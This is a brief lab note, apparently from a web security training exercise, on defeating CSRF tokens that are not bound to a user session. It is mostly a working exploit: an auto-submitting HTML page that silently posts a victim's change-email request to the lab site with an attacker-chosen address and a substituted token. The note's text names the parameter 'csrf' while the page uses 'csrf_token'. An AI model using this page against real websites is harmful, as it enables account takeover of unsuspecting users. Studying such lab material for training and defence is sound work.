If the vulnerable website does not tie CSRF Token to user session, attacker can genenate and replace his token in the `csrf` parameter.
```
<!DOCTYPE html>
<html lang="en">
<body>
    <h1>Fake Page</h1>
    <form method="POST"
        action="https://0a01009f039876498039128900c30081.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="hacker_lord_1@web-security-academy.net" >
        <input type="hidden" name="csrf_token" value="123456abcdef">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</html>
```